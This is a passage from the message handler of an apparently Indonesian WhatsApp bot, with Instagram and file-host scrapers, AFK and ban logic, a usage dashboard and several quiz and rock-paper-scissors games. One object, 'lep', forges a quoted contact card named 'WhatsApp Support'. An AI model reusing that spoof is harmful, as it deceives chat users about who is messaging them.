async function igStalk(username) {
    username = username.replace(/^@/, '')
    const html = await (await fetch(`https://dumpor.com/v/${username}`)).text()
    const $$ = cheerio.load(html)
    const name = $$('div.user__title > a > h1').text().trim()
    const Uname = $$('div.user__title > h4').text().trim()
    const description = $$('div.user__info-desc').text().trim()
    const profilePic = $$('div.user__img').attr('style')?.replace("background-image: url('", '').replace("');", '')
    const row = $$('#user-page > div.container > div > div > div:nth-child(1) > div > a')
    const postsH = row.eq(0).text().replace(/Posts/i, '').trim()
    const followersH = row.eq(2).text().replace(/Followers/i, '').trim()
    const followingH = row.eq(3).text().replace(/Following/i, '').trim()
    const list = $$('ul.list > li.list__item')
    const posts = parseInt(list.eq(0).text().replace(/Posts/i, '').trim().replace(/\s/g, ''))
    const followers = parseInt(list.eq(1).text().replace(/Followers/i, '').trim().replace(/\s/g, ''))
    const following = parseInt(list.eq(2).text().replace(/Following/i, '').trim().replace(/\s/g, ''))
    return {
        name,
        username: Uname,
        description,
        postsH,
        posts,
        followersH,
        followers,
        followingH,
        following,
        profilePic
    }
}
const lep = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"contactMessage": {
"displayName": "WhatsApp Support",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=6283833310095:+62 83833310095\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"
}}}
async function sfileDl(url) {
	let res = await fetch(url)
	let $ = cheerio.load(await res.text())
	let filename = $('div.w3-row-padding').find('img').attr('alt')
	let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
	let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
	let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
	return { filename, filesize, mimetype, download }
}
String.prototype.capitalize = function capitalize() {
        return this.charAt(0).toUpperCase() + this.slice(1, this.length)
    }
    /**
     * @returns {String}
     */
    String.prototype.capitalizeV2 = function capitalizeV2() {
        const str = this.split(' ')
        return str.map(v => v.capitalize()).join(' ')
    }
        //TIME
        const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let d = new Date();
    let locale = "id";
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let o = new Date
    let hari = o.toLocaleDateString(locale, { weekday: 'long' })
    let yoi = o.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
function formatDate(notx, locale = 'id') {
	let kz = new Date(notx)
	return kz.toLocaleDateString(locale, { timeZone: 'Asia/Jakarta' })
}
    let dateIslamic = Intl.DateTimeFormat(locale + '-TN-u-ca-islamic', {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    }).format(d)
        // Public & Self
        if (!miku.public) {
            if (!m.key.fromMe) return
        }
       // Detect User Banned
        if (ban[m.sender] && isCmd) {
            await miku.sendText(m.chat, `Maaf @${m.sender.split("@")[0]} Anda Telah Dibanned, Chat Owner Untuk Un Banned`, m, { contextInfo: { mentionedJid: [m.sender] }})
            return
        }
        
        const adduser = (sender, pushname) => {
            const obj = { id: sender, name: pushname, }
            users.push(obj)
            fs.writeFileSync('./lib/db/user.json', JSON.stringify(users))
        }
        const cekuser = (sender) => {
            let status = false
            Object.keys(users).forEach((i) => {
                if (users[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        const isUser = cekuser(sender)
        
        const addmail = (text) => {
            const obj = { email: text, }
            email.push(obj)
            fs.writeFileSync('./lib/db/email.json', JSON.stringify(email))
        }
        const cekmail = (text) => {
            let status = false
            Object.keys(email).forEach((i) => {
                if (email[i].email === text) {
                    status = true
                }
            })
            return status
        }
        const checkEmail = cekmail(text)
        const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}
//TicTacToe
/*this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `     「 Tictactoe Game 」
Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await miku.sendText(room.x, str, m, { mentions: parseMention(str) } )
await miku.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}*/
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
miku.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
miku.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) miku.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) miku.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) miku.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
miku.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) miku.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) miku.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
miku.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
        // Database
        try {
let users = afk[m.sender]
if (typeof users !== 'object') afk[m.sender] = {}
if (users) {
if (!isNumber(users.afkTime)) users.afkTime = -1
if (!('banned' in users)) users.banned = false
if (!('afkReason' in users)) users.afkReason = ''
} else afk[m.sender] = {
afkTime: -1,
banned: false,
afkReason: '',
}
} catch (err) {
console.log(err)
}
//afk
	for (let jid of mentionUser) {
let user = afk[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
`.trim())
}

if (afk[m.sender].afkTime > -1) {
let user = afk[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
`.trim())
user.afkTime = -1
user.afkReason = ''

}

        // Push Message To Console
        if (isCmd && !isGroup) {
			console.log(color('[ PRIVATE ]'), color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix}${command} [${args.length}]`), 'from', color(pushname))
        }
        if (isCmd && isGroup) {
			console.log(color('[ GROUP ]'), color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${prefix}${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        }
        let cBandwidth = await checkBandwidth()
        // Func dashboard
        let words = ["menu","owner","ytmp3","ytmp4","tiktok","s","sticker","dash","help","toimg","anonymous","dashboard","anonymous","start","leave","tiktok","yt","ttaud","ttvid","tahta","nulis","pinterest"]

if (isCmd && !m.isBaileys) {
try {
hitp = words.filter(suu => suu === command)
if (hitp[0] === command) {
hit.push({ sender: m.sender, cmd: command })
fs.writeFileSync('./lib/db/dash.json', JSON.stringify(hit))
}
} catch(err) {
console.log(err)
}
}
      if (budy.includes("NoNe2")) {
        if (isUser) return m.reply("nomor kamu sudah ada di database");
        m.reply("sukses");
        adduser(sender, pushname);
      }
        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in cmdmedia)) {
        let hash = cmdmedia[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: miku.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, miku.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        miku.ev.emit('messages.upsert', msg)
        }
	    
	if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (('family100'+m.chat in _family100) && isCmd) {
	    kuis = true
	    let room = _family100['family100'+m.chat]
	    let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
	    let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
	    if (!isSurender) {
	        let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
	        if (room.terjawab[index]) return !0
		room.terjawab[index] = m.sender
	    }
	    let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
	    let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
	return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}

${isSurender ? '' : ``}`.trim()
	    miku.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
	    if (isWin || isSurender) delete _family100['family100'+m.chat]
	}
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak kata`)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakbendera[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak bendera`)
                delete tebakbendera[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}caklontong`)
                delete caklontong[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (susunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = susunkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Susun Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}susunkata`)
                delete susunkata[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak kalimat`)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (siapaaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = siapaaku[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Siapa 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak siapa`)
                delete siapaaku[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        if (tekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tekateki[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Teka Teki 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tekateki`)
                delete tekateki[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }
	    
	if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak kabupaten`)
                delete tebakkabupaten[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }
	    
	if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkimia[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak kimia`)
                delete tebakkimia[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }
	    
	if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak lirik`)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}tebak tebakan`)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Salah!*')
        }

        switch(command) {
        case 'afk': {
		let user = afk[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`
${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
	    }
	    break
	    
        case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./plugins/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                miku.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'family100': {
	        if ('family100'+m.chat in _family100) {
		m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
		    throw false
	        }
	        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
		let random = anu[Math.floor(Math.random() * anu.length)]
	        let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
		    _family100['family100'+m.chat] = {
		    id: 'family100'+m.chat,
		     pesan: await miku.sendText(m.chat, hasil, m),
		    ...random,
		    terjawab: Array.from(random.jawaban, () => false),
	            hadiah: 6,
		}
	    }
            break
            case 'tebak': {
                if (!text) throw `Option:\n1. kata\n2. kalimat\n3. Siapa\n4. tebakan\n5. lirik\n6. kimia\n\nExample: tebak kalimat`
                
                  if (args[0] === 'kata') {
                      if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                          tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.jawaban)
                          m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                          delete tebakkata[m.sender.split('@')[0]]
                      }
                   } else if (args[0] === 'bendera') {
                      if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendFile(m.chat, result.img, '', `Silahkan Jawab Pertanyaan Diatas\n\nCode : ${result.flag}\nWaktu : 60s`, m).then(() => {
                          tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.name)
                          m.reply("Waktu Habis\nJawaban: " + result.name)
                          delete tebakbendera[m.sender.split('@')[0]]
                      }
                   } else if (args[0] === 'kalimat') {
                      if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                          tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.jawaban)
                          m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                          delete tebakkalimat[m.sender.split('@')[0]]
                      }
                   } else if (args[0] === 'siapa') {
                      if (siapaaku.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                          siapaaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (siapaaku.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.jawaban)
                          m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                          delete siapaaku[m.sender.split('@')[0]]
                      }
                   } else if (args[0] === 'kabupaten') {
		      if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendFile(m.chat, result.url, '', `Gambar Diatas Adalah Gambar dari Kabupaten?\nWaktu : 60s`, m).then(() => {
                          tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.title)
                          m.reply("Waktu Habis\nJawaban: " + result.title)
                          delete tebakkabupaten[m.sender.split('@')[0]]
                      }
		   } else if (args[0] === 'kimia') {
		      if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : 60s`, m).then(() => {
                          tebakkimia[m.sender.split('@')[0]] = result.unsur.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.unsur)
                          m.reply("Waktu Habis\nJawaban: " + result.unsur)
                          delete tebakkimia[m.sender.split('@')[0]]
                      }
		   } else if (args[0] === 'lirik') {
		      if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                          tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.jawaban)
                          m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                          delete tebaklirik[m.sender.split('@')[0]]
                      }
		   } else if (args[0] === 'tebakan') {
                      if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                      let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
                      let result = anu[Math.floor(Math.random() * anu.length)]
                      miku.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                          tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                      })
                      await sleep(60000)
                      if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
                          console.log("Jawaban: " + result.jawaban)
                          m.reply("Waktu Habis\nJawaban: " + result.jawaban)
                          delete tebaktebakan[m.sender.split('@')[0]]
                      }
                   }
              }
              break

              case 'dashboard': case 'dash': case 'Dash':{
hit_global = []
hit_user = []
filt_global = hit.map(res => res.cmd)
nar_global = new Set(filt_global);
cmd_global = [...nar_global]
for(let i of cmd_global){
try{
filtc_global = await hit.filter(hcm => hcm.cmd === i)
hit_global.push({
cmd: i,
hit: filtc_global.length
})
}catch{
}
}
hglobal = hit_global.sort(function(a, b){return b.hit - a.hit})
dhit_user = await hit.filter(hcm => hcm.sender === sender)
filt_user = dhit_user.map(res => res.cmd)
nar_user = new Set(filt_user);
cmd_user = [...nar_user]
for(let i of cmd_user){
try{
filtc_user = await dhit_user.filter(hcm => hcm.cmd === i)
hit_user.push({
cmd: i,
hit: filtc_user.length
})
}catch{
}
}
huser = hit_user.sort(function(a, b){return b.hit - a.hit})
tg = ''
for(let i=0; i<5; i++){
tg += `• > ${prefix}${hglobal[i].cmd} : ${hglobal[i].hit}\n`
}
tu = ''
if(huser.length < 5){
for(let i=0; i<huser.length; i++){
tu += `•  ➥ ${prefix}${huser[i].cmd} : ${huser[i].hit}\n`
}
}else{
for(let i=0; i<5; i++){
tu += `•  ➥ ${prefix}${huser[i].cmd} : ${huser[i].hit}\n`
}
}
var dash = `*DASHBOARD BOT*
${tg}`
m.reply(dash)
}
break
            case 'caklontong': {
                if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                let result = anu[Math.floor(Math.random() * anu.length)]
                miku.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                })
                await sleep(60000)
                if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply(`Waktu Habis\nJawaban : ${result.jawaban}\nDeskripsi : ${result.deskripsi}`)
                    delete caklontong[m.sender.split('@')[0]]
                }
            }
            break
